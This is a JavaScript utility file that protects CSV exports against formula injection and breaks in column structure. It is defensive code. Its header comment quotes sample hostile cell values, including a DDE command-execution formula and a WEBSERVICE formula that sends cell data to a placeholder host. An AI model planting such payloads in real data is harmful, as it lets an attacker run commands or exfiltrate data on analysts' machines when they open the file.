/**
 * CYBERDUDEBIVASH — CSV-safe cell encoding.
 * ═══════════════════════════════════════════════════════════════════════════
 * Every customer-downloadable CSV MUST route cells through csvCell()/csvRow().
 *
 * Two protections in one place:
 *
 *  1. CSV FORMULA INJECTION (CWE-1236 / OWASP "CSV Injection").
 *     Spreadsheet apps (Excel, Google Sheets, LibreOffice) execute a cell whose
 *     first character is = + - @ TAB or CR as a FORMULA. A hostile value such as
 *     `=cmd|'/c calc'!A1`, `=HYPERLINK(...)`, or `=WEBSERVICE("http://x/"&A1)`
 *     placed in attacker-influenceable data (threat titles, IOC values, actor
 *     names, resource paths, org names) then runs / exfiltrates data when a
 *     customer's SOC or compliance analyst opens the export. For a security
 *     product sold to enterprises this is an automatic procurement blocker.
 *     Mitigation: prefix a leading trigger char with a single quote so the app
 *     treats the cell as text — EXCEPT genuine numbers, which are left intact.
 *
 *  2. CSV STRUCTURE ESCAPING: cells containing comma, quote, CR or LF are wrapped
 *     in double quotes with internal quotes doubled, so a value can never break
 *     out of its column/row.
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
const PURE_NUMBER     = /^-?\d+(?:\.\d+)?$/; // keep legitimate negative/decimal numbers as-is
const NEEDS_QUOTING   = /[",\r\n]/;

export function csvCell(value) {
  let s = value == null ? '' : (typeof value === 'object' ? JSON.stringify(value) : String(value));

  // 1. Neutralize formula injection (but not real numbers like -5, 3.14).
  if (FORMULA_TRIGGER.test(s) && !PURE_NUMBER.test(s)) s = "'" + s;

  // 2. Structural quoting.
  if (NEEDS_QUOTING.test(s)) s = '"' + s.replace(/"/g, '""') + '"';

  return s;
}

export function csvRow(values) {
  return values.map(csvCell).join(',');
}
